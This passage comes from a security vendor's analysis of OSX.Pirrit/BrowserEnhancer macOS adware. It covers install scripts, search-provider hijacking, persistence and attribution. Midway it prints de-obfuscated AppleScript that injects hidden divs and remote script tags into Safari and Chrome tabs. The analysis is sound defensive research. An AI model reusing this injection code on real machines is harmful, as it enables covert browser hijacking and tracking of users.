​\nfairly easy to identify and remove, the authors chose a different path (which I will talk about\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nlater) and tracked the user’s browser. However, this installation script tries to remove old\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nversions of the user’s Safari browser extension and removes a Safari extension called\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n[“omnikey”.](http://marioestrada.github.io/safari-omnikey/) I don’t know what TargetingEdge has against Omnikey but if I had to guess, I’d say it\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ninterfered with either their browser hooking (more on that later) or the data they received from\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmachines with Omnikey installed.\n​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n10\n\n\n-----\n\nThe​ script​ ​ will​ ​ look​ ​ inside​ ​ the​ ​ _/Safari/Extensions​_ ​ **in​** ​ **every​** ​ **user’s​** ​ **home​** ​ **directory​** ​ to​ ​ see ​\nif there are any old installations and/or “unwanted” extensions. Any that are found are deleted.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nThis script will also try to do what TargetingEdge calls a “pure install”. It’s basically executing the\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\napp bundle that was in the archive - BrowserEnhancer.app.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**Analyzing​** **_BrowserEnhancer.app​_** **: ​**\n\nSince BrowserEnhancher.app is an actual binary executable (inside an app bundle, of course),\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nit requires some proper reverse engineering work:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nRight off the bat, when looking at the dylibs that the binary is loading, we can see that just like\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nlast year’s OSX.Pirrit, this is yet another QT project:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nThis is also evident when looking at some of the internal functions and data types in the binary:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n11\n\n\n-----\n\n_BrowserEnhancer.app’s​_ ​ has​ ​ several​ ​ responsibilities​ ​ but​ ​ its​ ​ major​ ​ one​ ​ is​ ​ reconfiguring ​\nproperties​ inside​ ​ the​ ​ internals​ ​ of​ ​ all​ ​ the​ ​ installed​ ​ browsers.​ ​ _BrowserEnhancer​_ ​ will​ ​ search​ ​ the ​\nsystem for installations of these browsers:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n  - Firefox\n\n  - Safari\n\n  - Chrome\n\n  - Internet explorer (See below).\n​ ​ ​ ​ ​ ​\n\nThis function is trying to read a Windows registry value related to Internet Explorer so that it\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ncould change some settings. Obviously, this function is in for some serious disappointment\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsince this is a Mach-O executable running on macOS.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n12\n\n\n-----\n\nOnce​ the​ ​ browsers​ ​ are​ ​ found,​ ​ _BrowserEnhancer​_ ​ will​ ​ modify​ ​ their​ ​ search​ ​ provider​ ​ settings ​\nfrom the browser’s default to **http://tika-search[.]com.** A quick visit to Tika-search’s about page\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nshows us that this is actually another venture of [Download](https://en.wikipedia.org/wiki/Download_Valley) Valley’s Goliath: Babylon Software.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n13\n\n\n-----\n\nIn other cases, depending on the browser’s setting or geolocation, the search provider will be\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nswitched to http://delta-search[.]com.\n​ ​ ​ ​ ​\n\nVisiting delta-search reveals a site that’s nearly identical to tika-search. Only the logo is\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndifferent.\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n14\n\n\n-----\n\nOnce​ _BrowserEnhancer​_ ​ was​ ​ executed​ ​ and​ ​ installed,​ ​ a​ ​ script​ ​ called​ ​ _post_install.sh​_ ​ stops​ ​ all ​\nrunning instances of Firefox and Chrome and restarts them so the changes can take effect.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nNote the use of _osascript,_ which we will get back to later.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n15\n\n\n-----\n\nOnce​ _updater​_ ​ and​ ​ _BrowserEnhacner​_ ​ are​ ​ installed,​ ​ the​ ​ main​ ​ installation​ ​ script​ ​ downloads ​\nanother archive file called uj_v_5.3_rf.tgz:\n​ ​ ​ ​ ​ ​ ​ ​\n\nThe​ content​ ​ of​ ​ the​ ​ file​ ​ is​ ​ then​ ​ extracted​ ​ to​ ​ _/var/tmp/mako​_ . ​\n\nThat directory contains yet another binary executable called _macver_ and yet another installation\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nscript called _install.sh_ and a _plist_ file named _macver.plist._\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​​ ​ ​ ​ ​ ​ ​\n\n**Let’s** **examine** **the** **installation** **script:**\n​ ​ ​ ​ ​ ​ ​ ​\n\nThe installation script starts with the TargetingEdge’s favorite modus-operandi: Generating a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nrandom​ name​ ​ from​ ​ the​ ​ wordlist​ ​ in​ ​ _/usr/share/dict/words​_ : ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n16\n\n\n-----\n\nOnce a random name is chosen, the script uses _defaults_ to write a new plist file to\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n_~/Library/Preferences/com.application.plist.​_ ​ It​ ​ will​ ​ add​ ​ a​ ​ new​ ​ dictionary​ ​ entry​ ​ to ​\nthat file. The dictionary will contain the random name that was chosen for the new executable by\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe installation and the name for the plist that holds its preferences:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAs​ we​ ​ can​ ​ see,​ ​ it​ ​ points​ ​ to​ ​ _com.sailcloth.plist​_ .​ ​ Let’s​ ​ look​ ​ at​ ​ that​ ​ file: ​\n\nAs we can see, the file contains the machine-uuid, and a URL that should be loaded each time\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthe browser is directed to visit google.com.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nOnce those plists are written, the script will then continue to create and run **individual**\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n**LaunchAgents** **that** **will** **run** **_macver_** **for** **every** **user** **on** **the** **machine** **but** **the** **guest** **user:**\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**Breaking​** **apart​** ​ **_macver​_** **: ​**\n\nDry facts first:\n​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n17\n\n\n-----\n\n_macver​_ is​ ​ a​ ​ Mach-O​ ​ 64-bit​ ​ executable​ ​ file.​ ​ It​ ​ is​ ​ not​ ​ importing​ ​ any​ ​ third-party​ ​ frameworks​ ​ such ​\nas Qt (for a change). However, closely examining this executable reveals some interesting\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndetails.\n\nThe strings section of the file contain a lot of base64 obfuscated content:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nDe-obfuscating the base64 strings reveals the following code:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nglobal _pid\n​ ​\nset _pid to \"pid_value_to_replace\"\n​ ​ ​ ​ ​ ​\n\nrepeat\n«event XFdrIjct» {}\n​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n18\n\n\n-----\n\nend repeat\n​ ​\n\non «event XFdrIjct» {}\n​ ​ ​ ​ ​ ​\ndelay 0.5\n​ ​\ntry\nif is_Safari_running() then\n​ ​ ​ ​\ntell application \"Safari\"\n​ ​ ​ ​\ntell application \"Safari\" to set page_source to do JavaScript \"document.body.innerHTML;\" in\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ncurrent tab of first window\n​ ​ ​ ​ ​ ​ ​ ​\nif page_source does not contain _pid then\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nset theURL to URL of current tab of first window\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nif theURL is not equal to \"about:blank\" then\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ntell application \"Safari\" to do JavaScript \"var pidDiv = document.createElement('div');\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\npidDiv.style.display = \\\"none\\\"; pidDiv.innerHTML = \\\"\" & _pid & \"\\\";\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndocument.getElementsByTagName('body')[0].appendChild(pidDiv);\" in current tab of first\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwindow\ntell application \"Safari\" to do JavaScript \"var js_script = document.createElement('script');\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\njs_script.type = \\\"text/javascript\\\"; js_script.src = \\\"script_to_inject\\\";\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndocument.getElementsByTagName('head')[0].appendChild(js_script);\" in current tab of first\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwindow\nend if\n​ ​\nend if\n​ ​\nend tell\n​ ​\nend if\n​ ​\nend try\n​ ​\nend «event XFdrIjct»\n​ ​ ​ ​\n\non is_Safari_running()\n​ ​\ntell application \"System Events\" to (name of processes) contains \"Safari\"\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nHere is another example:\n​ ​ ​ ​ ​ ​\n\non «event XFdrIjct» {}\n​ ​ ​ ​ ​ ​\ndelay 0.5\n​ ​\ntry\nif is_Chrome_running() then\n​ ​ ​ ​\ntell application \"Google Chrome\" to tell active tab of window 1\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nset sourceHtml to execute javascript\n​ ​ ​ ​ ​ ​ ​ ​\n\"document.getElementsByTagName('html')[0].innerHTML\"\nif sourceHtml does not contain _pid then\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ntell application \"Google Chrome\" to execute front window's active tab javascript \"var pidDiv =\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndocument.createElement('div'); pidDiv.style = \\\"display:none\\\"; pidDiv.innerHTML = \\\"\" & _pid\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n& \"\\\"; document.getElementsByTagName('body')[0].appendChild(pidDiv);\"\n​ ​ ​ ​\ntell application \"Google Chrome\" to execute front window's active tab javascript \"var js_script\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n= document.createElement('script'); js_script.type = \\\"text/javascript\\\"; js_script.src =\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n19\n\n\n-----\n\n\\\"script_to_inject\\\"; document.getElementsByTagName('head')[0].appendChild(js_script);\"\n​ ​\nend if\n​ ​\nend tell\n​ ​\nend if\n​ ​\nend try\n​ ​\nend «event XFdrIjct»\n​ ​ ​ ​\n\non is_Chrome_running()\n​ ​\ntell application \"System Events\" to (name of processes) contains \"Google Chrome\"\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nThat code is [AppleScript](https://en.wikipedia.org/wiki/AppleScript) (Jonathan Levin’s book *OS Internals volume I thoroughly covers\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nApplescript’s inner workings) and injects JavaScript code directly into the browser.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nLike I said earlier, this variant uses AppleScript. Instead of running a proxy server to intercept\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ntraffic or installing a browser plug-in that can be easily removed, the authors use Applescript\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n(which was originally meant for automation purposes) to inject javascript directly to the browser.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nUsing AppleScript, the authors can exfiltrate and inject both information and code from/to other\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\napps. In this case, AppleScript is used to poll the running browser for the currently viewed URL.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nThen, a block of JS code is injected into a hidden _<div>_ in every page that the browser is\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nvisiting. That code is used to extract information, to track the user and to plant code in the page\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nif needed.\n​ ​\n\n**Here’s** **the** **process:**\n​ ​ ​ ​\n_Macver​_ is​ ​ running​ ​ and​ ​ executing​ ​ (via​ ​ _NSTASK​_ )​ ​ [osascript​](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/osascript.1.html) ​ (the​ ​ AppleScript​ ​ interpreter),​ ​ which​ ​ will ​\nexecute the aforementioned (and some other) scripts that are going to interact and in fact “hook”\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n(to borrow terminology from [BeEF)](http://beefproject.com/) the browser. Once a browser is hooked, macver can read\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nand write (or inject) content to and from it. Once the browser loads a website, _macver_ knows\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nexactly what website is being visited and will then inject ads into the browser.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n20\n\n\n-----\n\nIn this example, once macver was running, I went to Google and searched for “error.” After I\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsubmitted the result, the browser immediately opened a new tab that displayed an ad for\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nMacKeeper, the well-known, fake antivirus program for Macs.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nIn the following image we can see _macver_ running in its own terminal window. By default,\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n_macver_ prints to _stdout_ a lot of debug information so there is actually very little need for\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ndebugging:\n\nMeanwhile, in the browser:\n​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n21\n\n\n-----\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n\n22\n\n\n-----\n\n**Attribution:**\nTargetingEdge has taken extraordinary efforts to distance itself from from the code that’s\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nrunning on an amazing number of machines worldwide. After analyzing different samples, I had\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nseveral C&C domains (the ones that are used to “phone home” to the authors and tell them\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwhich machines are infected). Every domain was registered with a privacy guard so there was\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nno way to find out who registered it using public information.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nEventually, I started cross-referencing domains with each other using ThreatCrowd and found\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthat some domains were not registered with a privacy guard. This was probably a mistake. A\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmistake was how I figured out who was behind OSX.Pirrit last year. I found the names of\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nTargetingEdge employees inside the permission tables of the dropped files. But they learned\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nfrom that mistake. They are no longer using their first and last names as usernames - they have\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nswitched to use more amusing names:\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n23\n\n\n-----\n\nThe non-private domains also had a DGA pattern and were connected to the same IP address,\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwhich is connected to other TargetingEdge domains. These included a privacy guard. As\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nThreatCrowd clearly shows, the non-private domains were registered by a person associated\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nwith TargetingEdge:\n​ ​\n\nAnd that’s not the only domain that’s connected to TargetingEdge. Here’s some whois data on\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n3fzf1fseg1xzgd1e5[.]us:\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n24\n\n\n-----\n\nAccording to LinkedIn, this individual was a senior executive at TargetingEdge and he is\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ncurrently the CEO of a “Blockchain-based digital advertising company.”\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\n**Wrapping** **things** **up:**\n​ ​ ​ ​\nAs I said before, Pirrit/BrowserEnhancer/DaVinci (or whatever you want to call it) is not a ground\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nbreaking threat. However, it is a great example of how an adtech company is borrowing\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nnefarious tactics found in malware to make it hard for antivirus software and other security\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nproducts to detect them. There is no difference between traditional malware that steals data\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nfrom its victims and adware that spies on people’s Web browsing and target them with ads,\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n25\n\n\n-----\n\nespecially when those ads are for either fake antivirus programs or Apple support scams.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nAdware is just another type of malware.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nAs for OSX.Pirrit malware, it runs under root privileges, creates autoruns and generates random\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nnames for itself on each install. Plus, there are no removal instructions and some of its\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ncomponents mask themselves to appear like they’re legitimate and from Apple. And don’t forget\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nthat TargetingEdge used domains that appeared to be generated by some sort of DGA and\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nmade many attempts to hide any link between the domains and TargetingEdge.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nOSX.Pirrit/BrowserEnhancer/DaVinci checks every box on the malware checklist and should be\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ntreated that way, even if its authors don’t like it. The security industry created the term\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n“potentially unwanted program”, or “PUPs”, to handle adware companies that try to intimidate\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nsecurity companies that identify their products as malware by sending them cease and desist\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\nletters. It’s time for a paradigm shift. If there’s code that’s mining data and hiding itself on a\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\ncomputer without any way of removing it, that’s malware, plain and simple.\n​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​\n\nCopyright​ ©​ ​ 2017​ ​ Cybereason​ ​ Inc.​ ​ All​ ​ rights​ ​ reserved. ​\n\n26\n\n\n-----\n\n#### ABOUT THE AUTHOR\n\n## AUTHOR\n\n###### AMIT SERPER PRINCIPAL SECURITY RESEARCHER\n\nAmit leads the security research at Cybereason’s Boston HQ.\nHe specializes in low-level, vulnerability and kernel research,\nmalware analysis and reverse engineering on Windows, Linux and\nmacOS. He also has extensive experience researching, reverse\nengineering, and exploiting IoT devices of various kinds. Prior to\njoining Cybereason, Amit spent nine years leading security research\nprojects and teams for an Israeli government intelligence agency,\nspecifically in embedded systems security (or lack of).\n\n\n#### 